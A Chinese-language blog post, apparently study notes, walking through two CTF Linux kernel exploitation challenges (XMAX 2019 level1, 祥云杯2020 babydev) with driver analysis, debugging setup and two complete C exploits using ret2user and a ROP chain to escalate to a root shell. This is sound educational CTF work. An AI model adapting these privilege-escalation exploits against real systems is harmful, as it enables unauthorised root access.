---
layout:     post
title:      kernel pwn入门之路（二）
subtitle:   例题复现
date:       2021-01-04
author:     X1ng
header-img: kernel.jpg
catalog: true
tags:
    - Linux kernel
    - pwn
    - 学习笔记
---

只会做几个烂大街的堆题目，，比赛堆题签个到走人

这好吗？这不好，，所以赶紧学学Linux kernel module pwn，记个笔记

非常感谢PKFXXXX学长的帮助 or2

## 例题

### XMAX 2019 level1

题目只给了4个文件

![](https://tva1.sinaimg.cn/large/0081Kckwly1glvo7aqyxdj30m805w3yf.jpg)

ida打开baby.ko

![](https://tva1.sinaimg.cn/large/0081Kckwly1glvmg0ex8vj31ty0u040o.jpg)

有三个函数，其中init_module和cleanup_module用来注册和移除驱动，可以看到注册的驱动叫baby

![](https://tva1.sinaimg.cn/large/0081Kckwly1glvmfipl6dj31ng0baacd.jpg)

分析sub_0

![](https://tva1.sinaimg.cn/large/0081Kckwly1glvmnlzd0dj31go0u0q4a.jpg)

`copy_from_user`存在栈溢出漏洞

解包文件系统

```shell
mkdir extracted; cd extracted
cpio -i --no-absolute-filenames -F ../initramfs.cpio
```

找到rcS文件

```shell
find . | grep "rcS"
vim ./etc/init.d/rcS
```

修改setsid一行的1000为0

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glvoeax602j31qo0jutbi.jpg)

重新打包文件系统

```shell
find . | cpio -o --format=newc > ../initramfs.cpio
cd ..
```

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glvoezj2qij31200q0gmo.jpg)

在`startvm.sh`末尾加上`-gdb tcp::1234`后启动内核

```shell
chmod +x startvm.sh
./startvm.sh
```

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glvotg6k6ej31s20l275u.jpg)

可以看到驱动加载基址为`0xffffffffc0002000`，`prepare_kernel_cred`地址为`ffffffff810b9d80`，`commit_creds`地址为`ffffffff810b99d0`

但是要进行下断点调试的话，由于这题ko文件没有符号表，只能通过地址来下断点，在ida里可以看到存在漏洞函数sub_0，相对基地址偏移为0，所以只需要在`0xffffffffc0002000`下断点就可以

>对于有时候ida中的地址不准确，可以通过miscdevice结构体
>
>![](https://tva1.sinaimg.cn/large/0081Kckwly1glvyapez50j30gm06v0sz.jpg)
>
>其中的file_operations结构体
>
>![](https://tva1.sinaimg.cn/large/0081Kckwly1glvyb2vhp3j30tg0hrq5v.jpg)
>
>找到漏洞函数的地址
>
>比如这题的
>
>![](https://tva1.sinaimg.cn/large/0081Kckwly1glvyle3wfoj30u01gb7wh.jpg)
>
>就可以通过
>
>```shell
>cat /proc/kallsyms | grep baby
>```
>
>可以看到三个函数的地址
>
>![](https://tva1.sinaimg.cn/large/0081Kckwly1glvyiztotjj30lm03qweq.jpg)
>
>之后在gdb中找到`init_module中`函数中调用的`misc_register(&off_120);`
>
>通过偏移找到存在漏洞函数的地址

由于什么保护都没有打开，可以直接ret2user

所以利用思路就是在exp代码中构造提权函数`commit_creds(prepare_kernel_cred(0));`以及恢复寄存器的函数，计算好偏移后直接覆盖内核中的返回地址为exp中用户态代码，完成提权

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwh3lm4ekj30u00wnjuh.jpg)

exp：

```c
//gcc -o exp exp.c -static

#include <stdio.h>

#include <pthread.h>

#include <unistd.h>

#include <stdlib.h>

#include <sys/ioctl.h>

#include <sys/types.h>

#include <sys/stat.h>

#include <fcntl.h>


#define KERNCALL __attribute__((regparm(3)))


void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810b9d80; // TODO:change it
void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff810b99d0; // TODO:change it

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_stat() {
    asm(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
}

void shell()
{
	system("/bin/sh");
	exit(0);
}

int get()
{
	commit_creds(prepare_kernel_cred(0));
	asm(
		"pushq   %0;"
		"pushq   %1;"
		"pushq   %2;"
		"pushq   %3;"
		"pushq   $shell;"
		"pushq   $0;"
		"swapgs;"
		"popq    %%rbp;"
		"iretq;"
		::"m"(user_ss), "m"(user_sp), "m"(user_rflags), "m"(user_cs)
	);
}


int main()
{
	save_stat();
	printf("[+]open drive\n");
	int fd = open("/dev/baby",0);
	if (fd < 0) {
		printf("[-] bad open device\n");
		exit(-1);
	}

	void *buf[0x100];
	printf("&buf : %x\n", &buf);
	for(int i = 0; i<0x12; i++){
		buf[i] = &get;
		printf("[+]buf[%d] = %x\n", i, buf[i]);
	}

	printf("[+]call ioctl\n");
	ioctl(fd, 0x6001, buf);

	return 0;
}
```



### 祥云杯2020 babydev

比赛时一脸懵逼

题目给了五个文件

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwhomgpkqj30sc05s74a.jpg)

ida打开ko文件

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwho5rgbtj31rj0u0tgr.jpg)

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwhohmcg3j31nc0mawjr.jpg)

可以看到注册的驱动叫mychrdev，总体实现的功能是一个字符设备的驱动程序，`kmalloc_order_trace`动态分配内存来保存文件的数据，其地址保存在mydata指针变量，根据文件读写指针对文件的数据进行读写，驱动程序中主要维护三个指针

- 在其file结构体的0x68偏移处存放文件读写指针
- 在mydata+0x10000中存放文件开头相对于mydata的偏移
- 在mydata+0x10008中存放文件结尾相对于mydata的偏移

file结构体

```c
struct file {
     union {
         struct llist_node    fu_llist;
         struct rcu_head     fu_rcuhead;
     } f_u;
     struct path        f_path;
     struct inode        * f_inode;    / * cached value * /
     const struct file_operations    * f_op;
 
     / *
      * Protects f_ep_links, f_flags.
      * Must not be taken from IRQ context.
      * /
     spinlock_t        f_lock;
     enum rw_hint        f_write_hint;
     atomic_long_t        f_count;
     unsigned int         f_flags;
     fmode_t            f_mode;
     struct mutex        f_pos_lock;
     loff_t            f_pos;                      //偏移 0x68
     struct fown_struct    f_owner;
     const struct cred    * f_cred;                //这里指向当前进程的cred结构体，偏移 0x90
     struct file_ra_state    f_ra;
 
     u64            f_version;
#ifdef CONFIG_SECURITY

     void            * f_security;
#endif

     / * needed for tty driver, and maybe others * /
     void            * private_data;
 
#ifdef CONFIG_EPOLL

     / * Used by fs / eventpoll.c to link all the hooks to this file * /
     struct list_head    f_ep_links;
     struct list_head    f_tfile_llink;
#endif /* #ifdef CONFIG_EPOLL */

     struct address_space    * f_mapping;
     errseq_t        f_wb_err;
     errseq_t        f_sb_err; / * for syncfs * /
} __randomize_layout
   __attribute__((aligned( 4 )));    / * lest something weird decides that 2 is OK * /
```

所以文件指针就是f_pos

驱动中定义了`open`函数、`read`函数、`write`函数、`llseek`函数以及`ioctl`函数

**`open`函数**

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwwvge9xej31ai0jowgp.jpg)

**`read`函数**

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glwxgqm9fmj31ev0u0dil.jpg)

a2是一个用户空间地址，a3是读取的长度size，a4是文件指针（可以通过linux kernel源码查看read函数调用接口）

`mydata + 0x10000`和`mydata + 0x10008`保存的都是0到0xffff 之间的数字，分别表示文件的头和尾相对于mydata的偏移

实现的功能是在满足条件的情况下将内核空间`v7 + v6 + mydata`处（也就是mydata+文件起始偏移+文件指针处）的数据读取到用户空间a2，并且文件指针会向后移动

**`write`函数**

![](https://tva1.sinaimg.cn/large/0081Kckwgy1gmai971cqsj31i40u0tb5.jpg)

a2是一个用户空间地址，a3是读取的长度size，a4类似于文件指针（可以通过linux kernel源码查看write函数调用接口）

`mydata + 0x10000`和`mydata + 0x10008`保存的都是0到0xffff 之间的数字，分别表示文件的头和尾相对于mydata的偏移

实现的功能是在满足条件的情况下将用户空间地址a2处长度为a3的数据传入内核空间`(mydata+0x10000) + v5 + mydata`处（也就是mydata+文件起始偏移+文件指针处），文件结尾`(mydata+0x10008)`加上写入的字节数，并且文件指针会向后移动

**`llseek`函数**

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glzbg71s9ej31i00u0tbs.jpg)

当`a3==0`时，函数功能是设置文件读写指针为a2

当`a3==1`时，函数功能是将文件读写指针跳转到`当前地址+a2`的位置

当`a3==2`时，函数功能是将文件读写指针跳转到文件倒数第`|a2|`（这里a2需要是负数）个位置

不知道是不是调试环境的原因，用户态调用时应该调用`lseek`函数

**`ioctl`函数**

只定义了`0x1111`操作

![](https://tva1.sinaimg.cn/large/0081Kckwgy1gmai5893nsj31i00u0wj5.jpg)

可以将 file结构体偏移0xc8位置的指针 所指向内存中的数据 传递到用户空间

漏洞点在`ioctl`函数和`write`函数

1. ioctl函数：

    看一下泄露出的数据中有什么信息

    ![](https://tva1.sinaimg.cn/large/0081Kckwly1gmbphyspz1j313f0u0wgw.jpg)

    其中`rsi+0x10`处有一个内核栈地址的相对偏移，`rsi+0x20`处保存着一个地址，经过测试可以知道是用来保存文件数据的mydata指针指向的地址

    ![](https://tva1.sinaimg.cn/large/0081Kckwgy1gmbpjox4cfj30tk09s3zc.jpg)

2. write函数：

    如果`文件读写指针+写入字节数>0x10000`，进入的if分支，会把写入字节数缩小为0x10000与文件读写指针的差值

    ida并没有识别好这一分支，查看汇编代码

    ![](https://tva1.sinaimg.cn/large/0081Kckwgy1gmbqkrfmz7j31mm052gmg.jpg)

    其中rdx寄存器则是文件指针，而`movzx`是零扩展并转移的意思

    也就是说假设rdx = 0x10001，则`sub rbx,rdx`后rbx寄存器中为`0xffffffffffffffff`，但是其低位寄存器bx中数据`0xffff`经过零扩展后，得到的ebx为`0x0000fffff`

    之后继续执行`copy_from_user`函数，此时的文件指针还是0x10001，而写入字节数确是0x0000fffff

    通过覆盖mydata + 0x10000以及mydata + 0x10008就可以实现任意地址读写

打开start.sh加上`-gdb tcp::1234`

![](https://tva1.sinaimg.cn/large/0081Kckwly1glwk4q5khrj310m0pygnt.jpg)

可以看到开启了`smep`和`smap`，没有开启`kalsr`

解包文件系统

```shell
mkdir extracted; cd extracted
cpio -i --no-absolute-filenames -F ../core.cpio
```

这道题没有`rcS`文件，用于初始化的文件是根目录下的`init`

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glwib4l6z3j31380ieta5.jpg)

修改init文件中setsid一行的1000为0

![](https://tva1.sinaimg.cn/large/0081Kckwgy1glwi8mug29j31am0oaad4.jpg)

打包文件系统

```shell
find . | cpio -o --format=newc > ../core.cpio
cd ..
```

打开qemu

```
./start.sh
```

gdb打开

```shell
gdb mychrdev.ko
add-symbol-file ./mychrdev.ko 0xffffffffc0000000
target remote :1234
```

进行调试

参考风沐云烟师傅和Nu1l战队的exp，使用rop的方法进行利用

1. ioctl泄露mydata指针指向的地址和栈上的地址，并计算返回地址

2. 第一次write将文件末尾偏移改为0xf000，第二次write将文件末尾偏移改为0x1ef00，第三次write就可以控制文件开头偏移和末尾偏移了

    需要注意的是第三次write如果直接用llseek将文件指针设置为0x10000的话，此时文件指针与写入字节数的和必然大于0x10000，进入存在漏洞的if分支后写入字节数为0x10000-0x10000=0，覆盖文件开头偏移和末尾偏移就失败了

    所以可以将文件指针设置为0x10001，并且从data第二个字节开始写入，然后通过llseek设置文件指针指向返回地址

3. 之后就是找到有用的gadget，将rop链写入内核栈中覆盖返回地址，执行`commit_creds(prepare_kernel_cred(0))`进行提权

exp:

```c
#include <stdio.h>

#include <stdlib.h>

#include <fcntl.h>

#include <string.h>

#include <unistd.h>

#include <pthread.h>


#include <sys/wait.h>

#include <sys/stat.h>

#include <sys/types.h>


#define pop_rdi_ret 0xFFFFFFFF813EAD2C

#define swapgs_popfq_ret 0xFFFFFFFF81C00EAE // swapgs; popfq; pop rbp; ret;

#define iretq 0xFFFFFFFF81025A56	// iretq; pop rbp; ret;

#define xchg_rax_rdi 0xFFFFFFFF81768EF2

#define vmlinux_base 0xFFFFFFFF81000000

#define dev_text_base 0xFFFFFFFFC0000000




#define KERNCALL __attribute__((regparm(3)))


void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff8108d690; // TODO:change it
void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff8108d340; // TODO:change it

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_stat() {
    asm(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory");
}

void shell()
{
	system("/bin/sh");
	exit(0);
}

size_t data[0x10000];
size_t mydata;
size_t stack;

int main()
{
	save_stat();
	signal(SIGSEGV, shell);
	signal(SIGTRAP, shell);

	int fd = open("/dev/mychrdev",O_WRONLY);
	ioctl(fd,0x1111,data);
	mydata = data[4];
	stack = (data[2] | 0xFFFFC90000000000) - 0x10;
	printf("[+] mydata at: %p\n",mydata);
	printf("[+] Stack at: %p\n",stack);

	write(fd,data,0xF000);
	lseek64(fd,0x100,0);

	write(fd,data,0x10000);
	lseek64(fd,0x10001,0);

	data[0] = stack - mydata;
	data[1] = stack - mydata + 0x10000;
	write(fd,(char*)data+1,0x10000);

	size_t off = stack&0xFF;
	lseek64(fd,off,0);

	int i = 0;
	data[i++] = pop_rdi_ret;
	data[i++] = 0;
	data[i++] = prepare_kernel_cred;
	data[i++] = xchg_rax_rdi;
	data[i++] = commit_creds;
	data[i++] = swapgs_popfq_ret;	// swapgs; popfq; ret
	data[i++] = user_rflags;	// rflags
	data[i++] = iretq;		// iretq;
	data[i++] = (size_t)shell;

	data[i++] = user_cs;		// cs
	data[i++] = user_rflags;	// rflags
	data[i++] = user_sp;		// rsp
	data[i++] = user_ss;		// ss
	write(fd,data,0x100);
	return 0;
}
```





>参考资料：
>
>[Linux Kernel Pwn 初探](https://xz.aliyun.com/t/7625)
>
>[祥云杯2020 babydev](http://www.yxfzedu.com/rs_show/702)
>
>[祥云杯2020 babydev详解](https://www.anquanke.com/post/id/223468)
>
>[fmyy's blog](https://fmyy.pro/2020/11/27/Competition/%E7%A5%A5%E4%BA%91%E6%9D%AF/#babydev)

